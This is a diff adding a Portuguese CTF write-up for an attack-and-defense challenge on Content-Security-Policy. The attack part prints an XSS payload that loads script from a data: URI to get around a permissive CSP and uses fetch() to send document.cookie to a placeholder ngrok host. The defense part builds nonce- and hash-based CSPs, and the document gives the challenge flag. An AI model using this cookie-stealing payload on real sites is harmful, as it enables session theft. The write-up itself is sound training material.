@@ -1076,14 +1076,80 @@ Assim, executamos o ataque trocando o valor para true, para dizer que estamos au
 
 <img src="images/Pasted image 20230827095752.png">
 
-## Defense and Attack (200)
+## Investigação (100)
 ### Descrição
+No mundo de segurança você vai precisar em alguns momentos atacar:
 
-### Arquivos anexados
+[https://ctf-attack.alquymia.com.br/](https://ctf-attack.alquymia.com.br/)
 
+E defender:
+
+[https://ctf-defense.alquymia.com.br/](https://ctf-defense.alquymia.com.br/)
+
+Juntando os dois mundos você vai conseguir ser um bom profissional.
 ### Flag
-
+```
+ALQ{@taqu3_e_def3nce_is_fun}
+```
 ### Solução detalhada
+
+#### Attack
+Para esse desafio, era preciso burlar o **Content-Secure-Policy** (CSP), que estava definido como:
+
+```
+Content-Security-Policy: script-src 'self' https://alquymia.com.br data:
+```
+
+Para burlar, utilizamos o seguinte payload de Cross-site Scripting:
+
+```
+<script src=data:text/javascript,fetch("https://SUA_URL.ngrok-free.app/?"+document.cookie)></script>
+```
+
+Utilizamos a ferramenta Ngrok junto com Python para abrir uma porta HTTP. Com sucesso conseguimos obter a primeira parte da flag.
+
+<img src="images/Pasted image 20230828150421.png">
+
+#### Defense
+<img src="images/Pasted image 20230828150928.png">
+
+No código fonte front-end do site, havia esses códigos Javascript que eram executados:
+
+<img src="images/Pasted image 20230828151050.png">
+
+O objetivo era permitir apenas os códigos Javascript com a tag ```SEGURO*```.
+
+Observamos que o primeiro código Javascript havia um nonce, então desenvolvemos um CSP para permitir apenas ele.
+
+```
+script-src 'nonce-no23h3v8bg';
+```
+
+Com sucesso conseguimos permitir.
+
+<img src="images/Pasted image 20230828151338.png">
+
+Para permitir o segundo código Javascript, geramos uma hash SHA256 de ```console.log("__SEGURO2__")``` com o comando ```echo -n 'console.log("__SEGURO2__")' | openssl sha256 -binary | openssl base64```
+
+<img src="images/Pasted image 20230828151604.png">
+
+<img src="images/Pasted image 20230828151708.png">
+
+Montamos o CSP e validamos ele no site:
+
+```
+script-src 'sha256-hii6FQk1E5f+ah0rqHNz3DAMNR2abz87DrsJsihCDjU=';
+```
+
+<img src="images/Pasted image 20230828151900.png">
+
+Posteriormente juntamos os dois CSP e enviamos para o site, que com sucesso, retornou a outra parte da flag, formando a flag ```ALQ{@taqu3_e_def3nce_is_fun}```.
+
+```
+script-src 'sha256-hii6FQk1E5f+ah0rqHNz3DAMNR2abz87DrsJsihCDjU=' 'nonce-no23h3v8bg';
+```
+
+<img src="images/Pasted image 20230828152023.png">
 
 # Osint
 
